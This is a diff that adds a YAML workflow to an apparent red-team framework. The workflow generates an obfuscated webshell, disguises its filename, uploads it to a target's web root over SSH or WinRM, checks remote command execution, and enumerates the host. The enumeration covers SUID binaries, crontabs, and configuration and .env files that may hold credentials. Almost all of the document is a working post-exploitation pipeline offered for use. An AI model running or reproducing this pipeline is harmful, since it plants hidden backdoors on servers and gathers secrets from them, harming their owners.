@@ -1,0 +1,297 @@
+name: webshell-ops
+description: |
+  Webshell operations pipeline — generate an obfuscated webshell,
+  upload it to a target via SSH/WinRM or direct HTTP, verify connectivity,
+  enumerate the host, and optionally pivot to deploy additional payloads.
+tags: [redteam, webshell, post-exploitation, pivot]
+dispatch:
+  inputs:
+    target:
+      required: true
+      type: string
+      description: Target host IP or hostname
+      alias: t
+    upload_method:
+      type: string
+      default: ssh
+      description: 'Upload method: ssh, winrm, or url (existing shell URL)'
+    shell_type:
+      type: string
+      default: php
+      description: 'Webshell language: php, jsp, aspx'
+    web_root:
+      type: string
+      default: /var/www/html
+      description: Remote web root directory
+    shell_password:
+      type: string
+      default: ofx_s3cr3t
+      description: Webshell authentication password
+    shell_url:
+      type: string
+      default: ''
+      description: 'Existing webshell URL (for upload_method=url)'
+    ssh_user:
+      type: string
+      default: root
+      description: SSH/WinRM username for upload
+    ssh_password:
+      type: string
+      default: ''
+      description: SSH/WinRM password for upload
+    ssh_key:
+      type: string
+      default: ''
+      description: SSH key path for upload
+    obfuscate:
+      type: string
+      default: 'true'
+      description: Obfuscate generated webshell
+
+jobs:
+  generate:
+    name: Generate Webshell
+    steps:
+    - name: create-shell
+      script: |
+        from pathlib import Path
+        import importlib
+
+        shell_type = '{{ inputs.shell_type }}'
+        password = '{{ inputs.shell_password }}'
+        obfuscate = '{{ inputs.obfuscate }}' == 'true'
+
+        gen_map = {
+            'php': 'ofx.api.exploitation.webshell.generators.php',
+            'jsp': 'ofx.api.exploitation.webshell.generators.jsp',
+            'aspx': 'ofx.api.exploitation.webshell.generators.aspx',
+        }
+
+        ext_map = {'php': '.php', 'jsp': '.jsp', 'aspx': '.aspx'}
+        mod_name = gen_map.get(shell_type)
+        if not mod_name:
+            print(f"[-] Unsupported shell type: {shell_type}")
+            raise SystemExit(1)
+
+        mod = importlib.import_module(mod_name)
+        cls_name = f"{shell_type.upper()}WebShell"
+        cls = getattr(mod, cls_name)
+        shell = cls(password=password)
+        code = shell.generate(obfuscate=obfuscate)
+
+        ext = ext_map[shell_type]
+        # Use innocuous filename
+        import hashlib, time
+        slug = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
+        filename = f'assets{slug}{ext}'
+        local_path = f'/tmp/{filename}'
+        Path(local_path).write_text(code)
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"shell_file={local_path}\n")
+            f.write(f"shell_filename={filename}\n")
+            f.write(f"shell_type={shell_type}\n")
+            f.write(f"shell_size={len(code)}\n")
+
+        print(f"[+] Generated {shell_type} webshell: {filename} ({len(code)} bytes)")
+        print(f"    Obfuscated: {obfuscate}")
+      log-stdout: true
+
+  upload:
+    name: Upload Webshell
+    needs: [generate]
+    if: "{{ inputs.upload_method != 'url' }}"
+    steps:
+    - name: deploy-shell
+      script: |
+        from ofx.api.post import RunnerRegistry
+        from pathlib import Path
+
+        method = '{{ inputs.upload_method }}'
+        kwargs = {'host': '{{ inputs.target }}', 'user': '{{ inputs.ssh_user }}'}
+        password = '{{ inputs.ssh_password }}'
+        ssh_key = '{{ inputs.ssh_key }}'
+        if password:
+            kwargs['password'] = password
+        if ssh_key:
+            kwargs['key_path'] = ssh_key
+
+        runner = RunnerRegistry.create(method, **kwargs)
+
+        local_file = '{{ jobs["generate"].outputs.shell_file }}'
+        filename = '{{ jobs["generate"].outputs.shell_filename }}'
+        web_root = '{{ inputs.web_root }}'
+        remote_path = f'{web_root}/{filename}'
+
+        runner.upload(local_file, remote_path)
+
+        # Set permissions
+        os_type = runner.detect_os()
+        if os_type != 'windows':
+            runner.run(f'chmod 644 {remote_path}')
+
+        shell_url = f'http://{{ inputs.target }}/{filename}'
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"shell_url={shell_url}\n")
+            f.write(f"remote_path={remote_path}\n")
+
+        print(f"[+] Webshell uploaded: {remote_path}")
+        print(f"[+] Shell URL: {shell_url}")
+      log-stdout: true
+
+  verify:
+    name: Verify Webshell
+    needs: [upload]
+    steps:
+    - name: test-connection
+      script: |
+        from ofx.api.exploitation.webshell.client import WebShellClient
+        import time
+
+        # Determine shell URL
+        upload_method = '{{ inputs.upload_method }}'
+        if upload_method == 'url':
+            shell_url = '{{ inputs.shell_url }}'
+        else:
+            shell_url = '{{ jobs["upload"].outputs.shell_url }}'
+
+        password = '{{ inputs.shell_password }}'
+
+        # Retry loop for web server to pick up the file
+        client = None
+        for attempt in range(5):
+            try:
+                client = WebShellClient(shell_url, password=password, verify_ssl=False, timeout=10)
+                if client.test_connection():
+                    break
+                client = None
+            except Exception:
+                client = None
+            time.sleep(2)
+
+        if not client:
+            print(f"[-] Failed to connect to webshell at {shell_url}")
+            raise SystemExit(1)
+
+        whoami = client.run_command('whoami').strip()
+        pwd = client.run_command('pwd').strip()
+        info = client.get_system_info()
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"shell_url={shell_url}\n")
+            f.write(f"shell_user={whoami}\n")
+            f.write(f"shell_pwd={pwd}\n")
+            f.write(f"shell_os={info.get('os', 'unknown')}\n")
+
+        print(f"[+] Webshell verified: {shell_url}")
+        print(f"    User: {whoami}")
+        print(f"    CWD: {pwd}")
+        print(f"    OS: {info.get('os', 'unknown')}")
+      log-stdout: true
+
+  enumerate:
+    name: Host Enumeration via Webshell
+    needs: [verify]
+    steps:
+    - name: enum-via-shell
+      script: |
+        from ofx.api.exploitation.webshell.client import WebShellClient
+
+        upload_method = '{{ inputs.upload_method }}'
+        if upload_method == 'url':
+            shell_url = '{{ inputs.shell_url }}'
+        else:
+            shell_url = '{{ jobs["verify"].outputs.shell_url }}'
+
+        password = '{{ inputs.shell_password }}'
+        client = WebShellClient(shell_url, password=password, verify_ssl=False, timeout=15)
+
+        cmds = {
+            'whoami': 'whoami',
+            'id': 'id',
+            'hostname': 'hostname',
+            'network': 'ip addr 2>/dev/null || ifconfig',
+            'arp': 'arp -a 2>/dev/null || ip neigh',
+            'processes': 'ps aux | head -30',
+            'connections': 'ss -tulnp 2>/dev/null || netstat -tulnp',
+            'writable_dirs': 'find / -writable -type d 2>/dev/null | head -20',
+            'suid_bins': 'find / -perm -4000 -type f 2>/dev/null | head -20',
+            'crontab': 'crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null',
+            'interesting_files': 'find / -name "*.conf" -o -name "*.ini" -o -name "*.env" -o -name "wp-config.php" 2>/dev/null | head -20',
+        }
+
+        results = {}
+        for name, cmd in cmds.items():
+            try:
+                results[name] = client.run_command(cmd).strip()
+            except Exception as e:
+                results[name] = f'Error: {e}'
+
+        from pathlib import Path
+        enum_file = '/tmp/ofx_webshell_enum.txt'
+        with open(enum_file, 'w') as f:
+            for name, output in results.items():
+                f.write(f"=== {name.upper()} ===\n{output}\n\n")
+
+        with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
+            f.write(f"enum_file={enum_file}\n")
+            f.write(f"enum_sections={','.join(results.keys())}\n")
+
+        print(f"[+] Enumeration via webshell complete: {len(results)} sections")
+        for name in results:
+            lines = len(results[name].splitlines())
+            print(f"    {name}: {lines} lines")
+      log-stdout: true
+
+  summary:
+    name: Webshell Ops Summary
+    needs: [verify, enumerate]
+    steps:
+    - name: report
+      run: |
+        echo "======================================================"
+        echo " WEBSHELL OPS: {{ inputs.target }}"
+        echo "======================================================"
+        echo ""
+        echo "--- Shell ---"
+        echo "  Type: {{ jobs['generate'].outputs.shell_type }}"
+        echo "  URL: {{ jobs['verify'].outputs.shell_url }}"
+        echo "  User: {{ jobs['verify'].outputs.shell_user }}"
+        echo "  OS: {{ jobs['verify'].outputs.shell_os }}"
+        echo ""
+        echo "--- Enumeration ---"
+        echo "  Sections: {{ jobs['enumerate'].outputs.enum_sections }}"
+        echo "  Dump: {{ jobs['enumerate'].outputs.enum_file }}"
+      log-stdout: true
+    - name: export-to-project
+      script: |
+        import shutil
+        from pathlib import Path
+
+        project = '{{ vars.project_path | default("", true) }}'
+        if not project:
+            print('No --project set, skipping export')
+        else:
+            target_safe = '{{ inputs.target }}'.replace('.', '_')
+
+            # Export enum
+            enum_file = '{{ jobs["enumerate"].outputs.enum_file | default("", true) }}'
+            if enum_file and Path(enum_file).is_file():
+                dest = Path(project) / 'hosts'
+                dest.mkdir(parents=True, exist_ok=True)
+                shutil.copy2(enum_file, dest / f'{target_safe}-webshell-enum.txt')
+                print(f'  [+] hosts/{target_safe}-webshell-enum.txt')
+
+            # Export shell info
+            post_dir = Path(project) / 'post-exploits'
+            post_dir.mkdir(parents=True, exist_ok=True)
+            info = (
+                f"Target: {{ inputs.target }}\n"
+                f"Shell URL: {{ jobs['verify'].outputs.shell_url }}\n"
+                f"Shell User: {{ jobs['verify'].outputs.shell_user }}\n"
+                f"Shell OS: {{ jobs['verify'].outputs.shell_os }}\n"
+            )
+            (post_dir / f'{target_safe}-webshell.txt').write_text(info)
+            print(f'  [+] post-exploits/{target_safe}-webshell.txt')
+      continue-on-error: true
